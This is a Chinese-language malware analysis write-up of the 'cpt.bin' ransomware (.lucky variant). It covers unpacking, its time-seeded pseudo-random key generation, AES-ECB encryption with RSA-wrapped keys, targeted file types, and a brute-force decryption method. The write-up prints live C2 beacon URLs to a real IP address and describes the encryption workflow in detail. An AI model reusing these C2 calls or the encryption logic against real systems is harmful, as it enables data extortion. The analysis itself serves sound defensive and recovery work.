样本名 | cpt.bin  
---|---  
作者 |  jishuzhain  
时间 | 2019.10.14  
平台 | Windows 7 sp1 x64 pro  
  
## 一、摘要

勒索软件是目前流行恶意软件的一个类别，是一种特殊的恶意软件，又被人归类为“阻断访问式攻击”（denial-of-access
attack），其与其他病毒最大的不同在于手法以及中毒方式。其中一种勒索软件仅是单纯地将受害者的电脑锁起来，而另一种则系统性地加密受害者硬盘上的文件。所有的勒索软件都会要求受害者缴纳赎金以取回对电脑的控制权，或是取回受害者根本无从自行获取的解密密钥以便解密文件。勒索软件通常通过木马病毒的形式传播，将自身掩盖为看似无害的文件，通常会通过假冒成普通的电子邮件等社会工程学方法欺骗受害者点击链接下载，但也有可能与许多其他蠕虫病毒一样利用软件的漏洞在联网的电脑间传播。

## 二、起因

由于绝大多数勒索软件均无法通过技术手段解密，必须拿到对应的解密私钥才行（AES加密文件，而RSA加密了AES的密钥，只有攻击者才有私钥），所以能不能解密的问题在于是否能获取到加密的密钥（针对大部分采用AES对称加密的情况而言），但这个样本的独特之处在于，它的构造逻辑不复杂，使用了计算机的随机数生成。而这个是伪随机，关于随机数的安全问题请查看[
_破密行動_ _: 以不尋常的角度破解 IDA Pro 偽隨機數_](https://devco.re/blog/2019/06/21/operation-crack-hacking-IDA-Pro-installer-PRNG-from-an-unusual-way/)。虽然网上已有相关的介绍文章，不怎么详细，最后决定自己分析一遍，尽可能详细的介绍分析过程。

## 三、分析环境

### 3.1 样本信息

文件名 | cpt.bin  
---|---  
sha256 | c0531f812a1ec5e825f7250f7b52db7621ecf93d973f0e3ba1aa0372e0f559f2  
sha1 | c6df4e3cf3eceab3afcf945a686db63dd24c8e1d  
md5 | 36e34e763a527f3ad43e9c30acd276ff  
文件名（工具脱壳后） | cpt.bin.upx.unpack  
sha256 | B251F65AB8CCB4A3B7DF376D0DCC70598C59AF1ADFE022F5A5C5DA0CD9D14D5C  
sha1 | 9F2685A5B290F047B7A1C392E9B37CAAC03C0D8D  
md5 | 7c5afa0eeb718b591d84ee7a9130735b  
  
### 3.2 本地工具

操作系统 | Win7_x64_sp1  
---|---  
调试工具 | ollydbg  
脱壳工具 | upx.exe（最新）  
虚拟机软件 | VMware12 pro  
反汇编工具 | IDA 7.0  
文本编辑工具 | notepad++  
查壳工具 | Detect It Easy  
IAT修复工具 | Import REC  
数据包捕获工具 | WireShark  
二进制文件查看工具 | 010 Editor 9.0.2  
文件搜索工具 | Evething  
  
## 四、静态分析

### 4.1 查壳

 **4.1.1 DIE查壳**

![image.png](https://image.3001.net/images/20191024/15719049895275.png!small)

![image.png](https://image.3001.net/images/20191024/15719049955300.png!small)

由结果可知，被加了壳，检测结果是压缩壳UPX(3.95)，目前最新的版本。

 **4.1.2 UPX脱壳**

4.1.2.1 手工寻找OEP

UPX为一款经典的开源压缩壳，可以手工脱壳， 也可以借助工具对其进行脱壳，这里就实验两种方法进行脱壳。由于分析环境为Win7
x64系统，ollydbg加载后，一般会自动随机基址加载，但该样本没有，估计已经被之前分析人员修改，又或者原本的样本并未使能相关的开启随机基址的标志，如下图：

![image.png](https://image.3001.net/images/20191024/15719050309122.png!small)

一载入运行，程序暂停在00617E20，单步运行，但一运行在773C9EFE就跑飞了，目前还未找到有关OEP的痕迹。

![image.png](https://image.3001.net/images/20191024/15719050398831.png!small)

只能重新运行程序，继续单步运行分析，在到达OEP前，会发现对一区段内容进行修改，接着修改内存属性，怀疑是解压缩。

![image.png](https://image.3001.net/images/20191024/15719050492040.png!small)

经过一段时间的单步运行查找，最终发现的OEP其实就在程序刚载入ollydbg时，中断的地址再往上一段指令，之后发现了远跳转，跳转到了00401480，所以OEP为00401480。

![image.png](https://image.3001.net/images/20191024/15719050581931.png!small)

![image.png](https://image.3001.net/images/20191024/15719050646823.png!small)

发现了OEP后，接着使用ollydbg自带的脱壳工具，将其dump下来。使用DIE查壳如下：

![image.png](https://image.3001.net/images/20191024/15719050746776.png!small)

![image.png](https://image.3001.net/images/20191024/15719050816518.png!small)

能识别相应的编译器与OEP，但此时dump下的程序，自然无法在系统运行成功，因为缺失了导入表，所以接着使用ImportREC来修复导入表，填写之前发现的OEP，然后寻找IAT表，如果无误后就可以修复之前dump下的本地文件了。

![image.png](https://image.3001.net/images/20191024/15719050894637.png!small)

![image.png](https://image.3001.net/images/20191024/15719051023984.png!small)

修复后，接着查壳如下：

![image.png](https://image.3001.net/images/20191024/15719051105303.png!small)

但手工对其脱壳后，程序载入后还是会暂停在00617E20，后续会对其原因进行说明与修复。

4.1.2.2 工具脱壳

使用官方的upx工具对其脱壳后（非常简单，只需一行命令），ollydbg载入时会停留在004D19D0，而由手工对其脱壳后，程序载入后还是会暂停在00617E20。这里的话是由于中断在了TLS回调函数1，地址为0x217E40h，关于TLS回调函数，TLS运行在main函数执行之前，会先执行TLS_CALLBACK函数，在函数开启或结束，线程或进程创建，结束之前都会调用TLS回调函数。简单的方式可以在main函数执行前调用IsDebuggerPresent函数检查它是否正在被调试。TLS在PE文件中image-TLS-Directory中表现，一个程序可以注册多个TLS回调函数。调试TLS回调函数的时候，可以在OllyDbg中选择Options->Debugging
Options->Events，然后设置System break-point作为第一个暂停的位置，这样就可以让OllyDbg在TLS回调执行前暂停。要修复暂停时的入口点，只需直接定位PE文件，把TLS回调函数的指针全部改为0即可。（与去除重定向表也差不多)，如下是使用010Editor定位TLS目录地址，将其地址置为0。

![image.png](https://image.3001.net/images/20191024/15719051225521.png!small)

之后使用ollydbg载入调试就会中断在入口点，如下图：

![image.png](https://image.3001.net/images/20191024/15719051336173.png!small)

但使用工具进行脱壳后，暂停的位置会是004D19D0，不过这里不影响之后的调试。

![image.png](https://image.3001.net/images/20191024/15719051446537.png!small)

至此脱壳修复成功，也能成功运行（注：需要以管理员权限运行才行）。

![image.png](https://image.3001.net/images/20191024/15719051525336.png!small)

接着生成了勒索信，修改了文件名并加密了文件。

![image.png](https://image.3001.net/images/20191024/15719051584333.png!small)

![image.png](https://image.3001.net/images/20191024/15719051652171.png!small)

## 五、动态分析

### 5.1 定位入口点

使用IDA对upx脱壳后的文件进行分析，找到start函数（当IDA识别不出main函数入口的时候，会通过寻找PE头里的AddressOfEntryPoint的值作为start函数地址），如下：

![image.png](https://image.3001.net/images/20191024/15719051838207.png!small)

![image.png](https://image.3001.net/images/20191024/15719051887305.png!small)

如何识别并寻找MinGW编译器编译的程序的main函数位置？

ollydbg载入后会发现存在__initenv，并且后续有3个参数入栈（这里的传参是直接使用寄存器传值给栈的方式代替push指令入栈进行传递），所以下方的call便是main函数00405A92，如下图：

![image.png](https://image.3001.net/images/20191024/15719051999899.png!small)

![image.png](https://image.3001.net/images/20191024/1571905208905.png!small)

### 5.2 核心函数分析

使用IDA对main函数（sub_405A92）转换成伪C代码后分析，如下图：

![image.png](https://image.3001.net/images/20191024/15719052174635.png!small)

00405A92函数内部结构很清晰，这里的话可以发现该样本并没有使用反静态分析的技巧，相应的API函数也直接显示了出来。

 **5.2.1 sub_4027E0函数分析**

双击进入该函数后，可发现是创建互斥量funny，防止多个程序实例运行。

![image.png](https://image.3001.net/images/20191024/15719052308443.png!small)

 **5.2.2 sub_403847函数分析**

进入后，首先sub_564610函数的作用是创建61个字节的空间。接着v0获取到了当前的时间，接着v0作为随机数生成函数的种子，之后在一段字符数组（ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789）里通过随机数与0x3E取模的值为位置，获取相应的字符并拼接成长度为61个字节的新字符数组。sub_552240函数的作用是将生成的字符数组复制到指定的区域，unk_60D124同样也保存了刚刚生成的字符数组。

![image.png](https://image.3001.net/images/20191024/15719052518419.png!small)

![image.png](https://image.3001.net/images/20191024/15719052576884.png!small)

对其动态分析，可发现生成的60个字节的字符数组如下（这里请注意，该60个字节的字符数组后续会被用来生成加密密钥）：

![image.png](https://image.3001.net/images/20191024/15719052654918.png!small)

 **5.2.3 sub_4D6E50函数分析**

该函数的作用是延时，同样是获取当前时间作为随机数种子，内部进入查看下。

![image.png](https://image.3001.net/images/20191024/15719052762836.png!small)

![image.png](https://image.3001.net/images/20191024/15719052801814.png!small)

 **5.2.4 sub_405900函数分析**

这里会生成16个字节的随机密钥，作为用户的唯一标识符。进入sub_403788函数内部查看，同样的是使用当前时间作为随机数生成的种子，循环16次取相应的字符拼接成一个16字节的字符数组，原始数组内容为ABCDEFGHIJPQRSTUVWdefghijklmnopqrstuvwx3456789。接着
sub_542050(v4, "C:\\\Windows\\\Temp\\\Ssession", v0);// 会在
C:\\\Windows\\\Temp\\\Ssession 目录下创建文件，v1 = (void *)sub_5621A0((int)v4,
&unk_60D13C);//将16个字节的随机密钥（用户的唯一标识符）写入之前创建的文件里。

![image.png](https://image.3001.net/images/20191024/1571905301285.png!small)

![image.png](https://image.3001.net/images/20191024/15719053054376.png!small)

![image.png](https://image.3001.net/images/20191024/15719053097374.png!small)

动态分析中的生成的16个字节随机密钥如下（注：该随机密钥是唯一的，用来识别受害者）：

![image.png](https://image.3001.net/images/20191024/15719053238619.png!small)

![image.png](https://image.3001.net/images/20191024/15719053362770.png!small)

在” C:\\\Windows\\\Temp\\\Ssession”目录下会创建一个文件，如下图：

![image.png](https://image.3001.net/images/20191024/1571905341821.png!small)

执行完后，随机密钥会被写入到文件里，如下图：

![image.png](https://image.3001.net/images/20191024/15719053506595.png!small)

 **5.2.5 sub_40473A函数分析**

该函数对之前生成的随机密钥进行RSA加密，并与之后的16个字节的随机密钥（用户唯一标识符）进行拼接，组成一段内容（注：由于是多次调试，每次的时间戳不一致导致种子不一致，于是生成的密钥内容不一致，但组成格式是一致的）。如下：

对文件完成加密后，该样本将使用RSA算法打包用于文件加密的AES密钥，并将其附加到文件末尾。

    
    
    [sOXetN6upqexr96ztd6w5eKw4q61tOOysbCxst614t7jtLXh4OHisuOy466vp6ewprKvsrOn4bHl4Kbi4uGz46+vp+Gmsq7itbWu4uWxsLHjpqan4d7ltbTg47HiprLgtKeupuHls97j5bLj4rG1s+Wv3rC0suDhp7Xhp6fg4eKvpt7htbOn4Kbj4+LltbKx4KfhpuDetLLhsbXltLLh5eG1puCnp7Dgr7Ph4bGn4bCxpuCnsOHe4OGy3rOytLWzpt7h4bHhsODer+Ov3qe1p+Hi4uG1p7Sx5bGu4aez4+Lg3rSup6bg4+HisLGwsODlteWmr6fj3uPls7Cz4qay4ODjsaew5eGzp+Kyr7OvruHi4OHh497eseOyruOv4Kfh3qeyr7Pjs97j5ePlsrDj4ODi5bKnsKfis66w4eKwsaazta+ypqa0ruGwprLis7XlsbCuprHj4Kflr7Cn5eK14qbjs6fes+Djsd7h5bOy47Kmtaa0tbTh4d7g5a/e4rGytLOz4bKnprO1p66xs6en4N6w46awsK7j3uXh4N7j4eGxsLWmrq6xpuCm47Gx3uWv46a13qaysN7irrGn4uHi4OPhsq+xrrPiruHh4rWmsK60p6am4K+ur7Wyr+Wxr+O0s7GzteDl4OG04K/grrTi4bCupq6w5a7gp97h4LCmruGm4+Gyr+Kz4LPjtK6zsrW0srHltLSv5bHe5a+vseHes7Hj5bOws+Ov3rO1seKmsq7i47Gysd6w3qa0pqbl3qanr+Pep67lpq/jtKfe4bKx4rLh4rWwp7KwtK+1srWyp7TlrrSzprGu47LeteCmr7Te4bGv4K+vtOOxsq6y47HiprOzs7GzsaamsK7ir7HgsrKn4+Xh4+WvteKup6a0prLlsuHgs+Cn3rOxseOms+DiseC04a7h3rPg3rDi4eK0s6+mprC05eCvp+Gxs7KmsuOy4q/is67h4N6xr7Gup+Ow4rPlp7Cm4bWz5eCms6aysd7esbCw4t60srOu4eC15a60s+WntOWysrGzruGn46+yp7S1r6/j4rWmsbCm5aaxr+Xi47Hl4OHg4LSy4qey46a0467jrrCvseCwr7S0s67hsOWwsa+n4aau47Hj4eWw4uW13rG0suLiseWysLSurqfjsqawr7Pg4N6zr+DisrXgsrWytLTe4+PgtLG0r7SxseLjs96xsLDi5a+m4bLlruCn3uOn4abls+Lip7GntOGm4uKz4uLjsOHg4bSzp66urq+wsLGntLOwsePjtLPhsbW13uWzsuPisLWzseKw4ae0r6ev4a6wsa61st7lpqe0sa7e4eGw3t6v4bSw5bCyr7LhteWxrt7i4N6upuCu4LLlrp8=]:[q7A43nlvi6Fqhtx8]

![image.png](https://image.3001.net/images/20191024/15719053723736.png!small)

**5.2.6 sub_405214函数分析**

通过遍历找到可用的盘符并遍历文件与目录寻找需要加密的文件，之后在特定位置写入勒索信内容。

![image.png](https://image.3001.net/images/20191024/1571905384360.png!small)

![image.png](https://image.3001.net/images/20191024/15719053916333.png!small)

sub_401A5E()函数里是需要加密的文件后缀名内容，如下：

    
    
    bak，sql，mdf，ldf，myd，myi，dmp，xls，xlsx，docx，pptx，eps，txt，ppt，csv，rtf，pdf，db，vdi，vmdk，vmx，pem，pfx，cer，psd

![image.png](https://image.3001.net/images/20191024/15719054127271.png!small)

获取可用的盘符，如下：

![image.png](https://image.3001.net/images/20191024/15719054209493.png!small)

动态分析如下，发现C盘可用。

![image.png](https://image.3001.net/images/20191024/15719054283877.png!small)

接着拼接路径，并在指定位置写入勒索信内容。

![image.png](https://image.3001.net/images/20191024/15719054355394.png!small)

![image.png](https://image.3001.net/images/20191024/157190544048.png!small)

![image.png](https://image.3001.net/images/20191024/15719054505331.png!small)

![image.png](https://image.3001.net/images/20191024/15719054605887.png!small)

![image.png](https://image.3001.net/images/20191024/15719054667428.png!small)

接着往下查看，会对文件与目录进行操作，获取需要加密的文件的位置。

![image.png](https://image.3001.net/images/20191024/15719054756888.png!small)

先判断文件是否已被加密，如未被加密（文件名不包含特定的格式）则进入文件加密流程，执行sub_4038D1加密函数，如下：

![image.png](https://image.3001.net/images/20191024/15719054851707.png!small)

加密的格式如下（注：由于是多次调试分析，用户唯一标识符由于时间戳的不同而与上文不同）：

原始文件名 | license.txt  
---|---  
加密文件名 | [nmare@cock.li]license.txt.qdQVPDgtn53Wj84P.lucky  
  
![image.png](https://image.3001.net/images/20191024/15719055068334.png!small)

**5.2.7 sub_4038D1函数分析（加密）**

双击进入sub_4038D1函数后，查看整体流程，可发现这里就是勒索软件加密文件的核心函数了，样本使用了openssl的加密库，如下：

![image.png](https://image.3001.net/images/20191024/15719055278295.png!small)

![image.png](https://image.3001.net/images/20191024/15719055348732.png!small)

首先获取需要加密的文件的大小，查看后续流程，可发现针对文件大小的不同有不同的加密流程，sub_4D2700函数按照第二个参数的值来对文件进行分块，用于后续加密的次数。

![image.png](https://image.3001.net/images/20191024/1571906166685.png!small)

接着获取原文件路径以及文件的后缀名，判断是否是”ibdata1”后缀名，之后判断是否是需要加密的文件后缀名，

![image.png](https://image.3001.net/images/20191024/15719063118507.png!small)

![image.png](https://image.3001.net/images/20191024/15719063214504.png!small)

![image.png](https://image.3001.net/images/20191024/15719063299242.png!small)

![image.png](https://image.3001.net/images/20191024/15719063375994.png!small)

如果是需要加密的文件后缀名，则开始先对C2发起请求，告知服务器要开始加密文件了。

![image.png](https://image.3001.net/images/20191024/15719063466591.png!small)

![image.png](https://image.3001.net/images/20191024/15719063525135.png!small)

使用WireShack抓取到的请求：[http://111.90.158.225/cyt.php?code=qdQVPDgtn53Wj84P&file=1&size=4404&sys=win&VERSION=4.3&status=begin](http://111.90.158.225/cyt.php?code=qdQVPDgtn53Wj84P&file=1&size=4404&sys=win&VERSION=4.3&status=begin)

![image.png](https://image.3001.net/images/20191024/15719063608685.png!small)

发完请求后，会停止相关服务与相应的进程，防止加密文件失败，如下图：

![image.png](https://image.3001.net/images/20191024/15719063735807.png!small)

接着获取之前生成的密钥（取随机字符数组的前32个字符），打开存在的文件，进入核心加密流程。

![image.png](https://image.3001.net/images/20191024/15719063822580.png!small)

![image.png](https://image.3001.net/images/20191024/15719063924893.png!small)

每次读取16个字节进行AESECB模式加密，之后又写入文件的源位置，依据之前有对不同大小的文件（字节数）做判断的情况，勒索软件会有额外的处理逻辑，仔细分析流程后可发现以下几种情况。

> 第一种情况，当文件大小小于10000000个字节的时候，会按照每16个字节对文件依次进行加密，最后不满足16个字节时（对16取模的余数），则不加密。
>
> 第二种情况，当文件大小大于10000000个字节的时候，但小于99999999个字节时，按照每16个字节对文件依次进行加密，但只加密前（文件大小
> /0x50）次。
>
> 第三种情况，当文件大小大于99999999个字节，但小于499999999个字节时，按照每16个字节对文件依次进行加密，但只加密前（文件大小
> /0x1E0）次。
>
> 第四种情况，当文件大小大于499999999个字节时，按照每16个字节对文件依次进行加密，但只加密前（文件大小 /0x500）次。

当前文件加密完后，勒索软件在文件末尾写入RSA加密AES密钥后的内容。

![image.png](https://image.3001.net/images/20191024/1571906408837.png!small)

![image.png](https://image.3001.net/images/20191024/15719064142404.png!small)

以下是动态分析中，加密文件的过程，仅仅是截取了一部分流程。

![image.png](https://image.3001.net/images/20191024/15719064245180.png!small)

对原文件进行改名，如下：

![image.png](https://image.3001.net/images/20191024/15719064331977.png!small)

获取加密的密钥，如下图：

![image.png](https://image.3001.net/images/20191024/15719064416086.png!small)

读取需要加密的文件的16个字节内容进缓冲区，如下图：

![image.png](https://image.3001.net/images/20191024/15719064502592.png!small)

举个例子，如下：

原内容 | IDA License Agre  
---|---  
AES加密密钥（ECB模式） | AHrT42Od3JgqMpxUfwpzeEe3WtrXTxVG  
输出结果 | 3A A5 DA 63 F1 DC 3A FB 2D 2B 04 3B 1A EB B1 01  
  
实际本地加密验证，如下：

![image.png](https://image.3001.net/images/20191024/15719064601321.png!small)

![image.png](https://image.3001.net/images/20191024/15719064662253.png!small)

加密后，但未添加RSA加密的内容，如下：

![image.png](https://image.3001.net/images/20191024/15719064742331.png!small)

完全加密后的文件内容如下：

![image.png](https://image.3001.net/images/20191024/15719064804469.png!small)

原始文件，如下：

![image.png](https://image.3001.net/images/20191024/15719064881479.png!small)

完全加密后的文件内容如下：

![image.png](https://image.3001.net/images/20191024/15719064969568.png!small)

sub_542460函数会使用RSA加密AES密钥，写入文件末尾，如下：

![image.png](https://image.3001.net/images/20191024/15719065031155.png!small)

![image.png](https://image.3001.net/images/20191024/15719065103321.png!small)

对文件完成加密后，该样本将使用RSA算法打包用于文件加密的AES密钥，并将其附加到文件末尾。

    
    
    [sOXetN6upqexr96ztd6w5eKw4q61tOOysbCxst614t7jtLXh4OHisuOy466vp6ewprKvsrOn4bHl4Kbi4uGz46+vp+Gmsq7itbWu4uWxsLHjpqan4d7ltbTg47HiprLgtKeupuHls97j5bLj4rG1s+Wv3rC0suDhp7Xhp6fg4eKvpt7htbOn4Kbj4+LltbKx4KfhpuDetLLhsbXltLLh5eG1puCnp7Dgr7Ph4bGn4bCxpuCnsOHe4OGy3rOytLWzpt7h4bHhsODer+Ov3qe1p+Hi4uG1p7Sx5bGu4aez4+Lg3rSup6bg4+HisLGwsODlteWmr6fj3uPls7Cz4qay4ODjsaew5eGzp+Kyr7OvruHi4OHh497eseOyruOv4Kfh3qeyr7Pjs97j5ePlsrDj4ODi5bKnsKfis66w4eKwsaazta+ypqa0ruGwprLis7XlsbCuprHj4Kflr7Cn5eK14qbjs6fes+Djsd7h5bOy47Kmtaa0tbTh4d7g5a/e4rGytLOz4bKnprO1p66xs6en4N6w46awsK7j3uXh4N7j4eGxsLWmrq6xpuCm47Gx3uWv46a13qaysN7irrGn4uHi4OPhsq+xrrPiruHh4rWmsK60p6am4K+ur7Wyr+Wxr+O0s7GzteDl4OG04K/grrTi4bCupq6w5a7gp97h4LCmruGm4+Gyr+Kz4LPjtK6zsrW0srHltLSv5bHe5a+vseHes7Hj5bOws+Ov3rO1seKmsq7i47Gysd6w3qa0pqbl3qanr+Pep67lpq/jtKfe4bKx4rLh4rWwp7KwtK+1srWyp7TlrrSzprGu47LeteCmr7Te4bGv4K+vtOOxsq6y47HiprOzs7GzsaamsK7ir7HgsrKn4+Xh4+WvteKup6a0prLlsuHgs+Cn3rOxseOms+DiseC04a7h3rPg3rDi4eK0s6+mprC05eCvp+Gxs7KmsuOy4q/is67h4N6xr7Gup+Ow4rPlp7Cm4bWz5eCms6aysd7esbCw4t60srOu4eC15a60s+WntOWysrGzruGn46+yp7S1r6/j4rWmsbCm5aaxr+Xi47Hl4OHg4LSy4qey46a0467jrrCvseCwr7S0s67hsOWwsa+n4aau47Hj4eWw4uW13rG0suLiseWysLSurqfjsqawr7Pg4N6zr+DisrXgsrWytLTe4+PgtLG0r7SxseLjs96xsLDi5a+m4bLlruCn3uOn4abls+Lip7GntOGm4uKz4uLjsOHg4bSzp66urq+wsLGntLOwsePjtLPhsbW13uWzsuPisLWzseKw4ae0r6ev4a6wsa61st7lpqe0sa7e4eGw3t6v4bSw5bCyr7LhteWxrt7i4N6upuCu4LLlrp8=]:[q7A43nlvi6Fqhtx8]

**5.2.8 sub_4028A8函数分析**

加密文件完成后，会再次向C2发起请求，表示文件加密完成。请求如下：

[http://111.90.158.225/cyt.php?code=6HSIAqWhGv9AlTEl&file=168&size=18272981&sys=win&VERSION=4.3&status=done](http://111.90.158.225/cyt.php?code=6HSIAqWhGv9AlTEl&file=168&size=18272981&sys=win&VERSION=4.3&status=done)

![image.png](https://image.3001.net/images/20191024/15719065265189.png!small)

### 5.3 最终结果

最后执行该命令，打开记事本，弹出相应的勒索信内容，告知用户，文件已被加密，当用户关闭该记事本窗口，样本则退出进程，没驻留。

ShellExecuteA(0, 0, "notepad.exe", "c:\\\\_How_To_Decrypt_My_File_.Dic", 0,
1);

![image.png](https://image.3001.net/images/20191024/15719065381138.png!small)

## 六、整体流程图

![image.png](https://image.3001.net/images/20191024/15719065556145.png!small)

## 七、查杀与解密

该样本未有自启动行为，在整个流程运行结束后，不会驻留进程，所以找到勒索原文件删除即可。在c:\\\\_How_To_Decrypt_My_File_.Dic路径删除勒索信，通过全盘文件搜索找到后缀为.lucky的文件，此时不要随意修改已经加密的文件，防止影响文件的修改时间与内容，最后给出相应的思路。

选取一些有标志性的文件，比如docx格式的文件，文件头开头一部分是一致的，由于是每次读取16个字节进行加密，所以先通过取出最早加密的文件的修改时间作为时间戳，然后取出用户唯一标识符（加密文件的文件名里的key），通过暴力破解伪随机数生成然后与用户唯一标识符比对，如果一致时，则可以得到生成用户唯一标识符时获取的时间，依据程序流程，接着以这个时间往前暴力枚举时间戳（由时间戳作为种子生成伪随机数）生成密钥来AES解密前16个字节内容与相同的标志进行比对，如果发现存在一致的情况，则可以得到加密时使用的密钥。

![image.png](https://image.3001.net/images/20191024/15719065728318.png!small)

![image.png](https://image.3001.net/images/20191024/15719065771710.png!small)

pdf文件头部是存在标志的

![image.png](https://image.3001.net/images/20191024/1571906584596.png!small)

拿pdf文件解密作为例子，通过暴力枚举时间戳生成相应的密钥，最终可获取到正确的加密密钥，最终可解密，如下图：

![image.png](https://image.3001.net/images/20191024/1571906592435.png!small)

## 八、总结

该样本不是最近出现的，但作为一款国内写的勒索，其实如果要成功运行，需要以管理员权限才能运行，
即使是以管理员权限运行，但是也会存在异常退出的情况，本地虚拟机实验的时候都得运行3次左右才能加密成功。当然笔者接触安全时间不长，文中如有错误，感谢指正。

## 九、IOC

    
    
    cpt.bin
    
    sha256 c0531f812a1ec5e825f7250f7b52db7621ecf93d973f0e3ba1aa0372e0f559f2	
    
    sha1	c6df4e3cf3eceab3afcf945a686db63dd24c8e1d	
    
    md5	36e34e763a527f3ad43e9c30acd276ff	
    
    111.90.158.225	
    
    http://111.90.158.225/cyt.php?code=j8TkdVrfhnxgFW36&file=1&size=186837&sys=win&VERSION=4.3&status=begin

## 十、参考

<https://github.com/knownsec/Decrypt-ransomware/blob/master/lucky-decrypt.py>

 ***本文作者：jishuzhain@漏洞盒子，转载青注明来自FreeBuf.COM**

